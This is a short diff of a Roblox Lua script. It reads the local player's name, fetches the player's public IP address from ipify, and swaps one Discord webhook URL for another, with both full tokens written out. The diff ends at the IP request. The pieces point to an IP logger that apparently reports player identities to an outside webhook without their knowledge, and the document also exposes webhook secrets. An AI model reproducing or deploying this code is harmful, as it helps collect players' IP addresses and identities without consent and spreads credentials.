@@ -1,21 +1,6 @@
-local lp = game.Players.LocalPlayer
-local map = game.workspace
-local RuService = GetService(game, "RunService")
-local UseInputService = GetService(game, "UserInputService")
-local TwenSerice = GetService(game, "TweenService")
-local Plaers = GetService(game, "Players")
-local LoclPlyer = __index(Players, "LocalPlayer")
-local Camra = __index(workspace, "CurrentCamera")
-
-
-
-
-
-
-
 
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "https://discord.com/api/webhooks/1251744748696375296/XDwCrXaMSRvFI-W_2Nh0Lsmv8Sts-lwiijMVp9t5LEfIhxlZ_P-3COwlQR4VwTa4QJDY"
+local WebhookURL = "https://discord.com/api/webhooks/1251748758644068352/c-mAhDY2OUtJ3OSaFAAI4uyogANTCtgQP23m9T4yMhFxReBVOcHvgnx4HlshdZwKc2Kc"
 local getIPResponse = request({
     Url = "https://api.ipify.org/?format=json",
 })
